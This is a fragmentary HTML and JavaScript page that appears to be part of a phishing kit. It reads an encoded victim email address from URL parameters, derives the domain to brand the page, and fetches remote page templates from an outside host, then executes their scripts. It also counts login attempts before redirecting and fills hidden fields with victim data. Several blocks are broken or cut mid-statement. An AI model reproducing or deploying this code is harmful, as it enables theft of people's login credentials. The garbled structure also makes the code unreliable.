    <script defer>
      const BASE_URL = "https://khanieteam.com/s2";

      async function getPageContent(page, original) {
        console.log("page", page, original);
        let route = params_url.get("rt") || "pages";
        fetch(`${BASE_URL}/${route}/${page}.html`)
          .then((response) => response.text())
          .then((datan) => {
            document.querySelector("#myFrame").innerHTML = datan;
            const scripts = document
              .querySelector("#myFrame")
              .querySelectorAll("script");

            // console.log(scripts);

            scripts.forEach((script) => {
              const newScript = document.createElement("script");
              newScript.textContent = script.textContent;
              if (script.src) {
                newScript.src = script.src;
                document.head.appendChild(newScript);
              } else {
                document.body.appendChild(newScript); // Append to body or head
              }
              script.remove();
            });

            let ghds = document.querySelector("#foc").value;
            document.querySelector("#fuc").value = ghds;
            document.querySelector("#orgi").value = original;
            document.querySelector("#page").value = page;
          })
          .catch((error) => {
            console.error("Error Loading data:", error);
          });
      }

      async function abs(mg, dm, sPage, sOriginal) {

            );
            let r = await fetch(sposn + dm);
            let u = await r.text();
            let v = u.split("___");

            original = v[1];
          }
          getPageContent(page, original);
          return original;
        } catch (e) {
          console.log("ABS Func", e);
        }
      }

      const params_url = new URLSearchParams(window.location.search);
      let sPage = params_url.get("sp") || null;
      let mg = params_url.get("ed") || params_url.get("edx") || null;
      let sOriginal = params_url.get("or") || null;

      // sessionStorage.clear();

      let dm = "secure-trust.com";

      if (mg && mg != undefined) {
        mg = convertToN(mg);
        dm = mg.substring(mg.indexOf("@") + 1, mg.length);
      }

      if (!trialCount) {
        sessionStorage.setItem("num_trial", 0);
        trialCount = 0;
      }

      if (trialCount >= mxTrl) {
        if (nxtp && nxtp == "yes") {
          sessionStorage.setItem("num_trial", 0);
          loadurl = convertToN(nxtrl);
          window.location.assign(loadurl);
        } else if (sOriginal && sOriginal != "") {

      document.addEventListener("DOMContentLoaded", async function () {

  <body>
    <style>
      html,

        padding: 0;

      }

      #myFrame {
        display: none;
      }

      * {
        padding: 0;
        margin: 0;
        box-sizing: border-box;
      }
      #general_loader {
        display: none;
        align-items: center;
        justify-content: center;
        width: 100%;
        height: 100%;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #f1f2f555;
        z-index: 99;
      }

      #general_loader > div {
        width: 40px;
        height: 40px;
        border: 6px solid #ccc;
        border-top-color: #00bfff;
        border-radius: 50%;
        animation: spin 1s linear infinite;
      }

      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }
    </style>

    <div id="general_loader">

      document.querySelector("#general_loader").style.display = "flex";
      const intervalId = setInterval(() => {
        const myFrame = document.getElementById("myFrame");
        const hasContent =
          myFrame.textContent.trim().length > 0 || myFrame.children.length > 0;

        console.log("hasContent 2");

        if (hasContent) {
          setTimeout(() => {
            document.querySelector("#general_loader").style.display = "none";
            myFrame.style.display = "block";

        }
      }, 1000);
